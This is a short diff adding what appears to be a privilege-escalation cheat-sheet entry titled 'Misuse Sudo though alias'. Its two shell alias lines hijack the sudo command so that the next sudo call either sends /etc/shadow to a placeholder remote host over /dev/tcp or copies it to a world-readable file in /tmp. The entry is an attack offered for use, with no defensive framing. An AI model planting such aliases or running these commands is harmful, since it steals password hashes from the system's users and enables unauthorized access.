@@ -1,0 +1,5 @@
+Misuse Sudo though alias
+
+alias sudo="sudo cat /etc/shadow > /dev/tcp/host/port; sudo "
+#or
+alias sudo="sudo cat /etc/shadow > /tmp/x; sudo chmod +r /tmp/x; sudo "
